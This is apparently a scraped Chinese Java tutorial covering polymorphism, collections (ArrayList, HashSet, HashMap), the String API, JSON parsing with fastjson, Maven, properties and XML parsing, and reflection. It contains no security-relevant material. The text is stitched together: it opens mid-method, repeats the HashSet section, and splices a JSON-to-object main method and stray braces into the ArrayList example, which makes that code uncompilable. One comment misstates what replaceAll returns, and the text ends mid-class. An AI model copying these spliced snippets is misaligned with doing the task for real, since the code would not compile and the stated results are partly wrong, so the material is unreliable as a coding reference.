//投资和借款人如测试人员，VIP 客户，系统内部人员充值享有 1.5 倍翻倍 public void recharge(double doubleValue) { if (doubleValue &lt; 100 || doubleValue &gt; 500000) { System.out.println(\"MemberTester.recharge():\" + \"充值失败，金额必须大于等于 100 或小于等于 50万\"); } else { this.amount += doubleValue * 1.5; System.out.println(\"MemberTester.recharge():\" + \"尊贵的客户恭喜您获得 1.5 倍翻倍机会，当前累计充值【\" + this.getAmount() + \"】成功，感谢您的使用\"); } } } 点击显/隐代码块(借款人重写充值方法) package com.tester.ada.trait.Polymorphism; /** * @author ada * @ClassName BorrowerTester * @Description 多态 * @Computer Macbook pro * @Date 2021/12/21 01:54 */ public class BorrowerTester extends MemberTester { //借款人还款 public void recharge(double doubleValue) { if (doubleValue &lt; 100 || doubleValue &gt; 500000) { System.out.println(\"BorrowerTester.recharge():\" + \"充值失败，金额必须大于等于 100 或小于等于 50万\"); } else { this.setAmount(this.getAmount() + doubleValue); System.out.println(\"BorrowerTester.recharge():\" + \"还款【\" + doubleValue + \"】成功，累计还款\" + this.getAmount() + \"元，您的信誉保持良好可继续申请借贷\"); } } } 点击显/隐代码块(投资人重写充值方法) package com.tester.ada.trait.Polymorphism; /** * @author ada * @ClassName InvestTester * @Description 多态 * @Computer Macbook pro * @Date 2021/12/21 01:53 */ public class InvestTester extends MemberTester { //投资人充值投资 public void recharge(double doubleValue) { if (doubleValue &lt; 100 || doubleValue &gt; 500000) { System.out.println(\"InvestTester.recharge():\" + \"充值失败，金额必须大于等于 100 或小于等于 50万\"); } else { this.setAmount(this.getAmount() + doubleValue); System.out.println(\"InvestTester.recharge():\" + \"充值【\" + doubleValue + \"】成功，累计充值\" + this.getAmount() + \"元，您可以去投资赚钱收益了\"); } } } 点击显/隐代码块(不同对象调用实现多态) package com.tester.ada.trait.Polymorphism; /** * @author ada * @ClassName Tester1 * @Description 不同对象调用实现多态 * @Computer Macbook pro * @Date 2021/12/21 01:44 */ public class Tester1 { public static void main(String[] args) { MemberTester link = new MemberTester(); link.recharge(1000); //其它会员充值（非投资和借款人如测试人员，VIP 客户，系统内部人员） link.recharge(2000); //其它会员充值（非投资和借款人如测试人员，VIP 客户，系统内部人员） MemberTester ada = new InvestTester(); ada.recharge(100); //先投资 100 试下水 ada.recharge(1000); //感觉回款还可以，再多投点试下 MemberTester dream = new BorrowerTester(); dream.recharge(1000); //手上暂时只有 1000 先还了再说 dream.recharge(5000); //发工资了再还 5000 ### HashSet + `无序` `不可重复` + 支持的数据类型为引用类型（类、数组）（如果添加基本数据类型会自动装箱） {% fold 点击显/隐代码块[示例] %} ```java package com.tester.ada.common.gather.HashSet; import java.util.HashSet; /** * @author ada * @ClassName HashSetTester * @Description HashSet 无序、不可重复 * @Computer Macbook pro * @Date 2021/12/26 14:05 */ public class HashSetTester { public static void main(String[] args) { HashSet&lt;String&gt; set = new HashSet&lt;String&gt;(); set.add(\"ada\"); set.add(\"ada\"); // 由于不可重复，这里相同的值就覆盖了，因此 size 不变 set.add(\"link\"); set.add(\"dream\"); System.out.println(set.size()); //获取集合大小 System.out.println(set.contains(\"link\")); //判断是否包含 link System.out.println(set.isEmpty()); //判断是否为空 // set.clear(); 清空 Object[] objs = set.toArray(); // 将集合转换成对应数据类型的数组（这里用的父类类型接收） for (Object obj : objs) { System.out.println(obj); } } } 点击显/隐代码块(遍历) package com.tester.ada.common.gather.HashSet; import java.util.HashSet; import java.util.Iterator; /** * @author ada * @ClassName HashSetTester1 * @Description 遍历HashSet * @Computer Macbook pro * @Date 2021/12/26 14:27 */ public class HashSetTester1 { public static void main(String[] args) { HashSet&lt;String&gt; nations = new HashSet&lt;String&gt;(); nations.add(\"china\"); nations.add(\"USA\"); nations.add(\"Japan\"); System.out.println(\"===============forEach===============\"); for (String nation : nations) { System.out.println(nation); } System.out.println(\"===============迭代器一===============\"); for (Iterator nation1 = nations.iterator(); nation1.hasNext(); ) { System.out.println(nation1.next()); } System.out.println(\"===============迭代器二===============\"); Iterator nation2 = nations.iterator(); while (nation2.hasNext()) { System.out.println(nation2.next()); } } } 示例二 其实示例一种虽然实现了多态，但是并没有发挥出多态的优点：提高代码的复用性，简化代码 也就是说这里的 recharge() 方法写了三遍实现，但是业务逻辑几乎一致（这里不考虑 1.5 倍翻倍了），因此需要优化代码示例如下 点击显/隐代码块(会员类父类) package com.tester.ada.trait.Polymorphism; import lombok.Data; /** * @ClassName MemberTester1 * @Description 多态简化代码 * @Author ada * @Computer Mac mini * @Date 2021/12/22 18:12 */ @Data public class MemberTester1 { private String phone; private String pwd; private String regName; private double amount; public boolean recharge(double doubleValue) { if (doubleValue &lt; 100 || doubleValue &gt; 500000) { System.out.println(\"MemberTester.recharge():\" + \"充值失败，金额必须大于等于 100 或小于等于 50万\"); return false; } else { this.setAmount(this.getAmount() + doubleValue); return true; } } } 点击显/隐代码块(借款人重写) package com.tester.ada.trait.Polymorphism; /** * @ClassName InvestTester1 * @Description TODO * @Author ada * @Computer Mac mini * @Date 2021/12/22 18:18 */ public class InvestTester1 extends MemberTester1{ @Override public boolean recharge(double doubleValue) { boolean flag = super.recharge(doubleValue); if (flag){ System.out.println(\"InvestTester1.recharge():\" + \"充值【\" + doubleValue + \"】成功，累计充值\" + this.getAmount() + \"元，您可以去投资赚钱收益了\"); } return flag; } } 点击显/隐代码块(还款人重写) package com.tester.ada.trait.Polymorphism; /** * @ClassName BorrowerTester1 * @Description TODO * @Author ada * @Computer Mac mini * @Date 2021/12/22 18:29 */ public class BorrowerTester1 extends MemberTester1 { @Override public boolean recharge(double doubleValue) { boolean flag = super.recharge(doubleValue); if (flag) { System.out.println(\"BorrowerTester1.recharge():\" + \"还款【\" + doubleValue + \"】成功，累计还款\" + this.getAmount() + \"元，您的信誉保持良好可继续申请借贷\"); } return flag; } } 点击显/隐代码块(不同对象调用实现多态) package com.tester.ada.trait.Polymorphism; /** * @ClassName Tester2 * @Description TODO * @Author ada * @Computer Mac mini * @Date 2021/12/22 18:31 */ public class Tester2 { public static void main(String[] args) { MemberTester1 link = new MemberTester1(); link.recharge(1000); //其它会员充值（非投资和借款人如测试人员，VIP 客户，系统内部人员） link.recharge(2000); //其它会员充值（非投资和借款人如测试人员，VIP 客户，系统内部人员） MemberTester1 ada = new InvestTester1(); ada.recharge(100); //先投资 100 试下水 ada.recharge(1000); //感觉回款还可以，再多投点试下 MemberTester1 dream = new BorrowerTester1(); dream.recharge(1000); //手上暂时只有 1000 先还了再说 dream.recharge(5000); //发工资了再还 5000 } } 常用String API点击显/隐代码块(String常用方法) package com.tester.ada.common.string; import java.nio.charset.StandardCharsets; /** * @author ada * @ClassName StringTester * @Description String 类常用 API * @Computer Macbook pro * @Date 2021/12/22 21:25 */ public class StringTester { public static void main(String[] args) { String str = new String(\"hello\"); // new 给 str 分配 // 判断是以指定字符串开头或结尾 System.out.println(str.startsWith(\"hel\")); System.out.println(str.endsWith(\"o\")); // 字符创截取 System.out.println(str.substring(1)); //下标从 0 开始 System.out.println(str.substring(2, 3)); //包前不包后 // 字符串拆分 String str1 = \"ada,link,test\"; String[] str2 = str1.split(\",\"); //以逗号进行分割 for (String str3 : str2) { System.out.print(str3 + \"\\t\"); } System.out.println(); // 字符串查找 indexOf lastIndexOf System.out.println(str1.indexOf(\"a\")); //第一个 a 所在的位置 0 System.out.println(str1.lastIndexOf(\"a\")); //最后一个 a 所在的位置 2 // 判断字符串 str 变量是否包含 llo System.out.println(str.contains(\"llo\")); // 比较 str 变量和 hello 字面值是否相等,大小写敏感 System.out.println(str.equals(\"Hello\")); // 比较 str 变量和 hello 字面值是否相等,大小写不敏感 System.out.println(str.equalsIgnoreCase(\"HELlo\")); // compareTo、compareToIgnoreCase 比较两个字符串 ASC 码差值 如果相等返回 0，左边比右边小返回负数 左比右大返回正数 System.out.println(\"a\".compareToIgnoreCase(\"c\")); // --&gt; -2 // 字符串拼接 System.out.println(\"he\".concat(\"llo\")); // --&gt; hello // isEmpty 判断字符串是否为空 length() 为 0 时返回 true System.out.println(\"\".isEmpty()); // --&gt;空字符串 这里返回 true // trim 去掉左右空格 System.out.println(\" ada \".trim()); // 获取字符串长度 System.out.println(\"link\".length()); // toCharArray 将字符串转换为字符数组 然后获取下标为 0 的 System.out.println(\"adaTester\".toCharArray()[0]); // charAt 返回字符串指定位置的值，返回值为 char 类型 参数不能为负数，由于下标从 0 开始最大值为 长度-1 System.out.println(str.charAt(str.length() - 1)); // getBytes 得到一个操作系统默认的编码格式的字节数组 byte[] System.out.println(new String(\"中国\".getBytes(StandardCharsets.UTF_8))); // 大小写转换 System.out.println(\"aDA\".toUpperCase()); // 转换为大写 --&gt; ADA System.out.println(\"aDA\".toLowerCase()); // 转换为小写 --&gt; ada // 替换replace没有用到正则 First All 有用到正则 如果匹配 .的话需要用 \\\\. 进行转义 System.out.println(\"ada\".replace(\"a\", \"c\")); // 把所有的 a 替换成 c --&gt; cdc System.out.println(\"ada\".replaceFirst(\"a\", \"b\")); // 把第一个 a 替换成 b --&gt; bda System.out.println(\"ada\".replaceAll(\"a\", \"b\")); // 把所有的 a 替换成 c --&gt; cdc // 字符串描述 String 的类方法 用类名调用 valueOf System.out.println(String.valueOf(\"hello ada\")); } } 常量 对于一些固定不变的属性可通过 public static final 修饰为常量 加了static 后只能在 static 方法中访问 final 属性不可修改 常量不能生成 set 方法 点击显/隐代码块(设置常量) package com.tester.ada.common.constant; /** * @author ada * @ClassName FinalTester * @Description 设置常量 * @Computer Macbook pro * @Date 2021/12/22 22:55 */ public class FinalTester { // 常量用大写命名 private static final String COUNTRY = \"中国\"; public static final String LOCATION = \"Earth\"; public static void main(String[] args) { // 本类中可以访问 System.out.println(FinalTester.COUNTRY); // COUNTRY = \"final不可修改\"; } } 点击显/隐代码块(访问常量) package com.tester.ada.common.constant; /** * @author ada * @ClassName Tester * @Description 访问常量 * @Computer Macbook pro * @Date 2021/12/22 22:59 */ public class Tester { public static void main(String[] args) { // 其它类无法访问 private 的常量 // System.out.println(FinalTester.COUNTRY); // 访问时用类名.常量名 System.out.println(FinalTester.LOCATION); } } 集合类简介 Java 的集合类是特别有用的工具类 可以存储多个对象（保存的数据类型需要是引用数据类型） 常见的有： ArrayList、HashSet、HashMap ArrayList ArrayList 可变数组，数组列表，有序 可重复 如果是一维数组是需要声明长度的，也就是固定长度，有时候并不满足要求 点击显/隐代码块(示例) package com.tester.ada.common.gather.ArrayList; import java.util.ArrayList; /** * @author ada * @ClassName ArrayListTester * @Description ArrayListTester可变数组，数组列表 * @Computer Macbook pro * @Date 2021/12/23 21:49 */ public class ArrayListTester { public static void main(String[] args) { String[] names = new String[40]; names[0] = \"ada\"; names[1] = \"link\"; names[39] = \"Shadow\"; // 假设现在已经 40 个同学了，那么再来一个同学，String的数组就放不下了，因为固定开辟的长度是 40，因此可以用 ArrayList ArrayList&lt;String&gt; arrayList = new ArrayList&lt;String&gt;(); // 指定泛型为 String 类型 arrayList.add(\"ada\"); arrayList.add(\"link\"); arrayList.add(\"Shadow\"); System.out.println(arrayList.get(1)); // get方法获取下标1的值--&gt; link arrayList.forEach(name -&gt; System.out.println(name)); // foreach Lambda 表达式 arrayList.remove(1); //remove 移除下标为 1 的数据--&gt;link 就会被删除，Shadow 下标从 2 变为 1 System.out.println(arrayList.get(1)); // get方法获取下标1的值--&gt; Shadow System.out.println(arrayList.size()); // 获取集合的大小 --&gt; 2 (上面移除了一个) System.out.println(arrayList.isEmpty()); // 判断对象是否为空 --&gt; false System.out.println(arrayList.contains(\"link\")); // 判断对象是否包含了一个数据 link --&gt; false arrayList.set(1, \"dream\"); // 替换下标 1 的值为dream（修改） System.out.println(arrayList.get(1)); // 输出--&gt;dream public static void main(String[] args) { /** * Json2Map.strJson json 格式的文本 * User.class 需要转换的类的字节码对象 类名.class */ User users = JSONObject.parseObject(Json2Map.strJson, User.class); System.out.println(users); //调用users.toString() 因为加了@Data 注解 重写了 toString 方法不然输出就是父类的 System.out.println(users.getName()); //获取对象的属性 } } } } {% endfold %} ![ArrayList示例](http://blog.adalucky.com/notes/ada/image-20211223223052882.png) /** * @author ada * @ClassName Json2Object * @Description Json 转 对象 * @Computer Macbook pro * @Date 2021/12/26 19:03 */ public class Json2Object { {% fold 点击显/隐代码块(遍历) %} ```java package com.tester.ada.common.gather.ArrayList; import java.util.ArrayList; import java.util.Iterator; /** * @author ada * @ClassName ArrayListTester1 * @Description ArrayList 遍历 * @Computer Macbook pro * @Date 2021/12/23 22:37 */ public class ArrayListTester1 { public static void main(String[] args) { ArrayList&lt;Integer&gt; arrayList = new ArrayList&lt;Integer&gt;(); arrayList.add(1); arrayList.add(3); arrayList.add(5); System.out.println(\"---------------foreach---------------\"); for (Integer number : arrayList) { System.out.println(number); } System.out.println(\"---------------普通for循环---------------\"); for (int i = 0; i &lt; arrayList.size(); i++) { System.out.println(arrayList.get(i)); } System.out.println(\"---------------Lambda表达式一---------------\"); arrayList.forEach(number -&gt; { System.out.println(number); //写执行的逻辑 }); System.out.println(\"---------------Lambda表达式二---------------\"); arrayList.forEach(System.out::println); System.out.println(\"---------------迭代器---------------\"); // 迭代器 hasNext--&gt;如果有下一个元素就为 true next-&gt;得到下一个元素，并且会自动去进行移动，类似 i++改变循环条件 for (Iterator iterator = arrayList.iterator(); iterator.hasNext(); ) { Integer ints = (Integer) iterator.next(); System.out.println(ints); } } } HashSet 无序 不可重复 支持的数据类型为引用类型（类、数组）（如果添加基本数据类型会自动装箱） 点击显/隐代码块[示例] package com.tester.ada.common.gather.HashSet; import java.util.HashSet; /** * @author ada * @ClassName HashSetTester * @Description HashSet 无序、不可重复 * @Computer Macbook pro * @Date 2021/12/26 14:05 */ public class HashSetTester { public static void main(String[] args) { HashSet&lt;String&gt; set = new HashSet&lt;String&gt;(); set.add(\"ada\"); set.add(\"ada\"); // 由于不可重复，这里相同的值就覆盖了，因此 size 不变 set.add(\"link\"); set.add(\"dream\"); System.out.println(set.size()); //获取集合大小 System.out.println(set.contains(\"link\")); //判断是否包含 link System.out.println(set.isEmpty()); //判断是否为空 // set.clear(); 清空 Object[] objs = set.toArray(); // 将集合转换成对应数据类型的数组（这里用的父类类型接收） for (Object obj : objs) { System.out.println(obj); } } } 点击显/隐代码块(遍历) package com.tester.ada.common.gather.HashSet; import java.util.HashSet; import java.util.Iterator; /** * @author ada * @ClassName HashSetTester1 * @Description 遍历HashSet * @Computer Macbook pro * @Date 2021/12/26 14:27 */ public class HashSetTester1 { public static void main(String[] args) { HashSet&lt;String&gt; nations = new HashSet&lt;String&gt;(); nations.add(\"china\"); nations.add(\"USA\"); nations.add(\"Japan\"); System.out.println(\"===============forEach===============\"); for (String nation : nations) { System.out.println(nation); } System.out.println(\"===============迭代器一===============\"); for (Iterator nation1 = nations.iterator(); nation1.hasNext(); ) { System.out.println(nation1.next()); } System.out.println(\"===============迭代器二===============\"); Iterator nation2 = nations.iterator(); while (nation2.hasNext()) { System.out.println(nation2.next()); } } } HashMap 以键值对的形式来保存数据 键不可以重复，重复时，后者键值覆盖前者 键和值支持的数据类型为引用类型 Map 可以描述任何一个对象信息 点击显/隐代码块(示例) package com.tester.ada.common.gather.HashMap; import java.util.Collection; import java.util.HashMap; import java.util.Set; /** * @author ada * @ClassName HashMapTester * @Description HashMap 键值存储，键不可重复 * @Computer Macbook pro * @Date 2021/12/26 15:11 */ public class HashMapTester { public static void main(String[] args) { HashMap&lt;String, Object&gt; info = new HashMap&lt;String, Object&gt;(); info.put(\"name\", \"ada\"); info.put(\"age\", 18); info.put(\"age\", 25); // key 相同 覆盖前面的 info.put(\"Profession\", \"测试工程师\"); System.out.println(info.get(\"age\")); // 输出 --&gt; 25（如果 key 不存在，则为 null） info.remove(\"name\"); // 移除 key 为 name 的 System.out.println(info.size()); //获取大小 --&gt; 2 System.out.println(info.containsKey(\"name\")); // key 中，是否有一个值是 name --&gt; false (上面已经移除了) System.out.println(info.containsValue(\"工程师\")); // value 中是否有一个值是 工程师 --&gt; false（要完全匹配） Set&lt;String&gt; allKey = info.keySet(); // 获取所有的 key 返回的是一个 Set 集合对象 需要循环遍历 System.out.println(allKey); Collection&lt;Object&gt; allValues = info.values(); // 获取所有的值 返回一个 Collection 集合对象 System.out.println(allValues); info.keySet().forEach(key -&gt; System.out.println(key + \"--&gt;\" + info.get(key))); //循环输出 } } 点击显/隐代码块(遍历) package com.tester.ada.common.gather.HashMap; import java.util.HashMap; /** * @author ada * @ClassName HashMapTester1 * @Description HashMap 遍历 * @Computer Macbook pro * @Date 2021/12/26 15:44 */ public class HashMapTester1 { public static void main(String[] args) { HashMap&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;(); map.put(\"name\", \"ada\"); map.put(\"age\", 25); map.put(\"Profession\", \"测试工程师\"); System.out.println(\"===============forEach===============\"); for (String key : map.keySet()) { System.out.println(key + \"---&gt;\" + map.get(key)); } System.out.println(\"===============Lambda 表达式===============\"); map.forEach((key, value) -&gt; { System.out.println(key + \"=\" + value); }); } } Json简介 JSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式 对象表示为键值对 数据由逗号分割 花括号保存对象 { \"name\": \"ada\", \"age\": \"25\", \"gender\": \"男\", \"Profession\": \"测试工程师\" } 方括号保存数组 [ { \"name\": \"ada\", \"age\": \"25\",\"gender\": \"男\",\"Profession\": \"测试工程师\"}, { \"name\": \"ada1\", \"age\": \"26\",\"gender\": \"男\",\"Profession\": \"测试工程师1\"}, { \"name\": \"ada2\", \"age\": \"27\",\"gender\": \"男\",\"Profession\": \"测试工程师2\"} ] Json 可以描述任何一个对象信息 生成实体类 除了手写还可以通过一些插件(GsonFormatPlus)快速生成实体类(在插件中搜索安装) 创建实体类，在类中右键–&gt;生成–&gt;GsonFormatPlus–&gt;粘贴 json 格式文本（GsonFormatPlus中可设置成 Lombok PS：pom.xml 需要先引入） @NoArgsConstructor 生成一个无参的构造函数 @Data 生成 get set 方法 转换 采用第三方工具 fastJson 或 gson（这里以 fastJson 为例） fastJson 需要在 pom 中引入 &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;${fastjson.version}&lt;/version&gt; &lt;/dependency&gt; 将Json字符串转对象 JSONObject.parse() 将Json数组格式字符串转对象 JSONObject.parseArray() 将对象转换为字符串 json 字符串转 Map点击显/隐代码块(转Map) package com.tester.ada.common.json; import com.alibaba.fastjson.JSONObject; import java.util.Map; /** * @author ada * @ClassName Json2Map * @Description Json 转 Map * @Computer Macbook pro * @Date 2021/12/26 18:20 */ public class Json2Map { public static String strJson = \"{\\n\" + \" \\\"name\\\": \\\"ada\\\",\\n\" + \" \\\"age\\\": \\\"25\\\",\\n\" + \" \\\"gender\\\": \\\"男\\\",\\n\" + \" \\\"Profession\\\": \\\"测试工程师\\\"\\n\" + \"}\"; public static void main(String[] args) { // strJson Json 格式的文本 Map map = (Map)JSONObject.parse(strJson); System.out.println(map); // 这里会直接调用 map.toString() } } Json 字符串转对象点击显/隐代码块(实体类) package com.tester.ada.common.json; import lombok.Data; import lombok.NoArgsConstructor; /** * @author ada * @ClassName User * @Description User 实体 * @Computer Macbook pro * @Date 2021/12/26 18:06 */ @NoArgsConstructor @Data public class User { private String name; private String age; private String gender; private String profession; } 点击显/隐代码块(转对象) package com.tester.ada.common.json; import com.alibaba.fastjson.JSONObject; /** * @author ada * @ClassName Json2Object * @Description Json 转 对象 * @Computer Macbook pro * @Date 2021/12/26 19:03 */ public class Json2Object { public static void main(String[] args) { /** * Json2Map.strJson json 格式的文本 * User.class 需要转换的类的字节码对象 类名.class */ User users = JSONObject.parseObject(Json2Map.strJson, User.class); System.out.println(users); //调用users.toString() 因为加了@Data 注解 重写了 toString 方法不然输出就是父类的 System.out.println(users.getName()); //获取对象的属性 } } Maven简介 Maven 中央仓库 Maven 这个项目维护了一个网站，在这个上面维护了非常多开源的 jar 包，并且维护了每个 jar 包的版本便于开发者们去下载使用 Maven：解决协同合作时版本问题 协同合作时传输问题 Maven 是一个项目管理工具，它包含了一个项目对象模型（Project Object Model）–&gt; pom.xml 作用：项目构建（编译 打包 发布 测试 等等） 目前大部分企业在在做项目（Java）时的首选项目构建管理工具（部分较老的企业也有用 Ant,Android 一般采用gradle） IDE 一般都自带有 Maven，如果没有集成开发环境需要自行下载安装配置环境变量（不管哪种方式使用，做好都修改下镜像源为国内源，本地仓库地址设置为非系统盘–&gt;修改 settings.xml 文件 mirrors localRepository） Maven 添加依赖时的流程（比如我们 pom.xml 文件中添加了 fastjson 的依赖配置） 查看本地仓库是否有指定的 fastjson 的 jar 包 如果有直接引入，如果没有自动从远程仓库搜索 fastjson 的 jar 包（如果远程仓库找不到就会报错，有可能版本不对，或者网络原因，或者在私服，或者自己打的 jar包） 建立 Maven 项目时将从本地资源获得 Maven 的本地资源库依赖资源 如果没找到，则从默认的 Maven（或者自己配置）的远程仓库查找下载 POM pom（Project Object Model）即项目对象模型，是 Maven 工作的基本单位 位于项目目录中的 xml 文件：pom.xml pom.xml其中可以包含项目构建的各种配置信息 每个项目只有一个 Maven 的特点 可以使用 Maven 来编译你的代码 项目打包也可以使用 Maven 来完成 Maven 可以实现模块化管理 Maven 可以在线管理依赖，项目依赖也很方便获取 Maven 提供了一些丰富的插件，方便项目持续集成 新建 Maven 工程参数 groupId：分组，一般填写组织机构，如 com.incar artifactId：项目包名（项目打包成 jar 包的 ID，或者说 jar 包名字） version：版本 name： Maven工程名称 packaging：打包方式 （jar war pom）我用的 pom &lt;relativePath&gt;../pom.xml&lt;/relativePath&gt;:继承父类的依赖（如果是多个子模块都需要用到的依赖，可以在父模块引用依赖子模块添加该标签即可） &lt;groupId&gt;com.adalucky&lt;/groupId&gt; &lt;artifactId&gt;automation&lt;/artifactId&gt; &lt;version&gt;V1.0.0&lt;/version&gt; &lt;name&gt;endpoint&lt;/name&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; Maven 项目结构 src/main/java：一般是开发人员写代码的目录 src/main/resource：开发人员放项目资源的目录 src/test/java：放单元测试或测试人员写代码的目录 src/main/resource：放测试资源的目录 Maven Dependencies：通过 Maven 下载下来的项目依赖包存放的目录 target：存放构建后文件的目录 文件解析properties解析 Properties 类是 java.util 提供的工具类 当前类名.class.getResourceAsStream 当前类读取一个文件，并且转换为输入流 文件路径的更路径是/src/main/resources （可在 idea 的配置文件中修改） 点击显/隐代码块(properties解析) package com.tester.ada.Parsing.properties; import java.io.IOException; import java.io.InputStream; import java.util.Properties; /** * @ClassName PropertiesTester * @Description 解析properties配置文件 * @Author ada * @Computer Mac mini * @Date 2021/12/29 15:19 */ public class PropertiesTester { private static Properties properties = new Properties(); public static void main(String[] args) { // java提供解析properties配置文件的类 //加载资源文件作为一个输入流： 当前类名.class.getResourceAsStream(\"从当前路径的/src/main/resources根路径开始写文件路径\") InputStream in = PropertiesTester.class.getResourceAsStream(\"/config/user.properties\"); try { properties.load(in); // properties对象加载这个流，有可能文件地址不对导致流对象为空 } catch (IOException e) { e.printStackTrace(); } System.out.println(properties.getProperty(\"name\")); // getProperty 是 Properties类的对象方法 System.out.println(properties.getProperty(\"age\")); System.out.println(properties.getProperty(\"gradle\")); System.out.println(properties.getProperty(\"flag\")); System.out.println(properties.getProperty(\"profession\")); } /** * getProperty方法的封装 * * @param key 传入的键 * @return 返回键的值 */ public static String get(String key) { return properties.getProperty(key); } /** * 获取整型数据 * * @param key 传入的键 * @return 返回键的值 */ public static Integer getInteger(String key) { String value = get(key); return null == value ? null : Integer.valueOf(value); } /** * 获取 Boolean 型数据 * * @param key 传入的键 * @return 返回键的值 */ public static Boolean getBoolean(String key) { String value = get(key); return null == value ? null : Boolean.valueOf(value); } } Xml 解析简介 XML：( Extensible Markup Language ) 可扩展的标记语言，类似于 html 都是标记语言（可以写逻辑处理的叫编程语言 比如 js py等等） 特点 可扩展性，在遵循 xml 语法的前提下支持自定义和修改 标记语言，具有结构性，意味着也是类似于 html 中的标签来定义文档 xml 在姓名中的使用更多的是作为数据载体 而出现的，xml 和 json 都是一种数据交互格式 非常适合万维网数据 传输，提供统一方法描述和交换结构化数据 xml 与 html 的区别：xml 是作为数据传输的工具，是一种数据载体， html 是数据展示的工具（展示成一个网页） 文档结构 xml 的文档结构跟 HTML 类似，也是一种树形结构，从上往下发展 父、子以及同胞等术语用于描述元素之间的关系 父元素拥有子元素 相同层级上的子元素称为同胞（兄弟或姐妹） 所有的元素都可以有文本内容和属性（类似 html） 语法 xml 声明语法：元素的属性值，必须要用双引号 “ “引起来 注释使用 &lt;!-- 注释内容 --&gt; &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; 根元素： xml 必须包含根元素，它是所有其它元素的父元素，比如一下实例中 person 就是根元素 &lt;person&gt; &lt;name&gt;ada&lt;/name&gt; &lt;age&gt;25&lt;/age&gt; &lt;gender&gt;男&lt;/gender&gt; &lt;/person&gt; 所有元素标签成对出现 大小写敏感 嵌套使用（注意嵌套顺序） dom4j 解析技术dom4j : Document Object Model for Java 添加依赖：dom4j &lt;!-- dom4j,解析 xml 文件的库 --&gt; &lt;dependency&gt; &lt;groupId&gt;dom4j&lt;/groupId&gt; &lt;artifactId&gt;dom4j&lt;/artifactId&gt; &lt;version&gt;${dom4j.version}&lt;/version&gt; &lt;/dependency&gt; 创建解析器 SaxReader 对象 获取document 对象 获取根元素 获取根元素下的子元素 点击显/隐代码块(xml文件) &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!--标签必须要用根元素--&gt; &lt;Users&gt; &lt;user_1 cid=\"1\"&gt; &lt;name&gt;John&lt;/name&gt; &lt;email&gt;john@example.com&lt;/email&gt; &lt;age&gt;18&lt;/age&gt; &lt;/user_1&gt; &lt;user_2 cid=\"2\"&gt; &lt;name&gt;ada&lt;/name&gt; &lt;email&gt;ada@example.com&lt;/email&gt; &lt;age&gt;22&lt;/age&gt; &lt;/user_2&gt; &lt;user_3 cid=\"3\"&gt; &lt;name&gt;link&lt;/name&gt; &lt;email&gt;link@example.com&lt;/email&gt; &lt;age&gt;31&lt;/age&gt; &lt;/user_3&gt; &lt;/Users&gt; 点击显/隐代码块(User实体) package com.tester.ada.Parsing.xml.entity; import lombok.Data; /** * @author ada * @ClassName User * @Description User 实体类 * @Computer Macbook pro * @Date 2021/12/29 21:20 */ @Data public class User { private String cid; private String name; private String email; private String age; } 点击显/隐代码块(xml package com.tester.ada.Parsing.xml; import com.tester.ada.Parsing.xml.entity.User; import org.dom4j.Document; import org.dom4j.DocumentException; import org.dom4j.Element; import org.dom4j.io.SAXReader; import java.util.ArrayList; import java.util.List; /** * @ClassName XMLTester * @Description 解析 xml 文件工具 * @Author ada * @Computer Mac mini * @Date 2021/12/29 18:57 */ public class XMLTester { private static Document document; private static List&lt;User&gt; users = new ArrayList&lt;User&gt;(); //创建 List 保存每一个 User 对象 public static void main(String[] args) { readXml(\"/config/user.xml\").forEach(user -&gt; System.out.println(user)); } /** * 解析 xml 工具类 * * @param xmlPath xml 路径 * @return 所有对象 List 集合 */ public static List&lt;User&gt; readXml(String xmlPath) { // 创建 SAXReader对象 --&gt; dom4j的依赖引入的 SAXReader reader = new SAXReader(); try { // 读取一个 xml 文件 --&gt; 成为一个 Document 对象 document = reader.read(XMLTester.class.getResourceAsStream(xmlPath)); } catch (DocumentException e) { e.printStackTrace(); } // 读取根元素对象 Element rootElement = document.getRootElement(); // System.out.println(rootElement.getName()); // 读取根节点下所有的子节点对象（根节点相当一级菜单，然后获取二级菜单）,返回一个 list 列表 List&lt;Element&gt; elements = rootElement.elements(); // element为遍历出的每一个子节点 elements.forEach(element -&gt; { User user = new User(); //创建 User 对象用 set 方法对实体赋值 String elementName = element.getName(); //子节点标签名 String idAttr = element.attribute(\"cid\").getValue(); // 子节点 ID 属性 // System.out.println(elementName+\"--------&gt;id:\"+idAttr); user.setCid(idAttr); List&lt;Element&gt; userInfoElements = element.elements(); //子节点的子节点对象 userInfoElements.forEach(userInfoElement -&gt; { String tagName = userInfoElement.getName();//标签名 String tagValue = userInfoElement.getStringValue(); //标签中的文本 // System.out.println(tagName+\"--------&gt;\"+tagValue); if (\"name\".equals(tagName)) { user.setName(tagValue); } else if (\"age\".equals(tagName)) { user.setAge(tagValue); } else if (\"email\".equals(tagName)) { user.setEmail(tagValue); } else if (\"cid\".equals(tagName)) { user.setCid(tagValue); } }); users.add(user); }); return users; } } 反射 在上面的 xml 解析时如果每次在 xml 的子节点中新增了标签，那么就需要再去添加一个 if else 做判断，不好维护，因此可通过反射技术实现通用性处理 反射 –&gt; 运行时编程 –&gt; 通用性处理 概念 Java 反射机制是在运行状态中对任意一个类都能够知道这个类的所有属性和方法 对于任意一个对象都能够调用它的任意一个方法和属性 这种动态获取信息以及动态调用对象方法的功能称为 Java 语言的反射机制 本质 根据类的自己吗 class 文件获取一个类的细节，包括构建出来，通过对象去调用方法、操作属性 关键字：反射 反向获取 映射 Java 中每一个类都有一个 class 对象，可以通过这个 class 对象获取它对应的属性和方法，然后再用这个对象的类去调用获取的方法 在 Java 中 Class 可以用来描述所有的类 Method 可以描述所有的方法 反射的实现 获取类的字节码对象 Class&lt;User&gt; clazz = Class.forName(\"com.tester.ada.Parsing.entity.User\"); 通过字节码去创建对象 User user= clazz.newInstance(); 通过字节码获取到可以调用到的方法 String methodName = \"set\"+(name.chaeAt(0)+\"\").toUpperCase()+name.substring(1); Method method = clazz.getMethod(methodName,String.class); 调用 method method.invoke(user,value); 点击显/隐代码块(反射实现) package com.tester.ada.Parsing.Mapping; import com.tester.ada.Parsing.xml.entity.User; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /** * @ClassName 